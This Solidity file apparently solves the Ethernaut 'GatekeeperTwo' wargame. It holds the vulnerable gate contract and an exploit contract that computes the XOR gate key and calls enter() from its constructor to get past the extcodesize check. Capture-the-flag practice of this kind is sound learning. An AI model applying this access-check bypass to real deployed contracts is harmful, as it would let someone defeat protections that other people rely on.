// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";
contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Exploit is Destructible, Targeted {
  constructor(address target_addr) payable Targeted(target_addr) {
    // we have to do the exploit here to satisfy gateTwo
    GatekeeperTwo gate = GatekeeperTwo(target_addr);
    uint64 one = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 key = one ^ type(uint64).max;
    gate.enter(bytes8(key));
  }
  function exploit() public payable {
    require(GatekeeperTwo(Targeted(this).target()).entrant() == tx.origin, "exploit failed");
  }
  receive() external payable {
  }
}